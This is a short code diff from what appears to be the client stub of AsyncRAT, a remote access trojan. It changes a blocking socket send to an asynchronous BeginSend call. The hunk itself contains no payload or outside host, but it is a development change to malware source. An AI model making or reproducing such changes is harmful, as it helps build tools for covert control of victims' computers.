@@ -173,7 +173,7 @@ Namespace AsyncRAT_Stub
                     MS.Write(B, 0, B.Length)
 
                     S.Poll(-1, SelectMode.SelectWrite)
-                    S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
+                    S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
                 End Using
             Catch ex As Exception
                 isDisconnected()
